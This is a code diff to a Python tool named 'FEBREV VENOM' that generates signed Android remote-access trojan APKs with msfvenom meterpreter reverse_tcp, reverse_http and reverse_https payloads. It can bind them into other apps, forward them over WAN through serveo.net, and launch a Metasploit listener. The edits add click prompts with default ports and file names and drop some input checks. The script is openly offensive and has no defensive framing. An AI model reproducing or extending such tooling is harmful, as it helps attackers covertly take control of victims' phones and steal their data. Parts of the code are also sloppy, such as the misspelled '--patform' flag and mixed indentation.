@@ -1,6 +1,7 @@
 import os
 import webbrowser
 import socket
+import click
 os.system('echo -e "\033[1m \e[33m WELCOME TO FEBREV VENOM"')
 print("""
   ______ ______ ____  _____  ________      __ __      ________ _   _  ____  __  __ 
@@ -27,10 +28,10 @@ print("""[1]android/meterpreter/reverse_tcp
 
 """)
 payload=int(input("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE : "))
-output=input("ENTER THE PATH OF YOUR OUTPUT APK (example : /root/Desktop)[note: dont use ' / ':at the end of path] : ")
-name=input("ENTER THE NAME OF YOUR RAT APK(example: rat.apk) : ")
-lhost=input("ENTER YOUR IP ADDRESS(lhost) : ")
-lport=input("ENTER YOUR LISTENER PORT(lport) : ")
+output=click.prompt("ENTER THE PATH OF YOUR OUTPUT APK (example : /root/Desktop)[default /root/]: ", type=str, default="/root")
+name=click.prompt("ENTER THE NAME OF YOUR RAT APK(example: rat.apk)[default febrev.apk]: ", type=str, default="febrev.apk"  )
+lhost=click.prompt("ENTER YOUR IP ADDRESS(lhost) : ", type=str, default=socket.gethostbyname(socket.gethostname()))
+lport=click.prompt("ENTER YOUR LISTENER PORT(lport)[default 6595] : ", type=str, default="6595")
 def venom():
     if payload==1:
         bind=input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
@@ -44,15 +45,11 @@ def venom():
             else:
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
-        elif bind=="n" or bind=="N":
+        else:
             os.system(f"msfvenom -p android/meterpreter/reverse_tcp -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
-            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
-    
-        else:
-            print("INVALID INPUT>>>>>>!!!!!")
-      
+            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")   
     elif payload==2:
         bind = input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
         if bind == "Y" or bind == "Y":
@@ -65,15 +62,11 @@ def venom():
             else:
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
-        elif bind == "n" or bind == "N":
+        else:
             os.system(f"msfvenom -p android/meterpreter/reverse_http -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
-       
-        else:
-            print("INVALID INPUT>>>>>>!!!!!")
-    
     elif payload==3:
         bind = input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
         if bind == "Y" or bind == "Y":
@@ -86,22 +79,17 @@ def venom():
             else:
                 print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                 print("failed........!!!!!!!")
-        elif bind == "n" or bind == "N":
+        else:
             os.system(f"msfvenom -p android/meterpreter/reverse_https -a dalvik --patform=android lhost={lhost} lport={lport} > {output}/{name}")
             print("SIGNING YOUR APK>>>>>>")
             os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
             print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")
-
-        else:
-            print("INVALID INPUT>>>>>>!!!!!")
-            print("exiting.......please rerun the tool")
     elif payload==4:
         	malware="android/meterpreter/reverse_tcp"
 	        ip=socket.gethostbyname(socket.gethostname())
-	        port=input("ENTER THE PORT TO FORWARD OVER WAN(the same listener port you entered) : ")
+	        port=click.prompt("ENTER THE PORT TO FORWARD OVER WAN(the same listener port you entered)[default 6595] : ", type=str, default="6595")
 	        path=input("enter the path to save your payload : ")	
 	        serv=socket.gethostbyname("serveo.net")
-	        name=input("ENTER THE NAME FOR YOUR PAYLOAD : ")
 	        print(f"GENERATING YOUR PAYLOAD APK  --->> {name}.apk ")
 	        os.system(f"msfvenom -p {malware} -a dalvik --platform=android lhost={serv} lport={port} > {path}/{name}.apk")
 	        print("SIGNING YOUR APK>>>>>>...")
@@ -236,7 +224,7 @@ def venom():
          msfp=input("ENTER THE NAME OF THE PAYLOAD YOU WANNA LISTEN : ")
          print("STARTING METASPLOIT METERPRETER FOR YOUR PAYLOAD....")
          os.system("service postgresql start")
-         lip=socket.gethostbyname(socket.gethostname())
+	 lip=socket.gethostbyname(socket.gethostname())
 	 os.system(f"msfconsole -x 'use multi/handler; set LHOST {lip}; set LPORT {lport}; set PAYLOAD {msfp}; exploit'")
     else:
          print("EXITING.....BYE BYE>>>>")
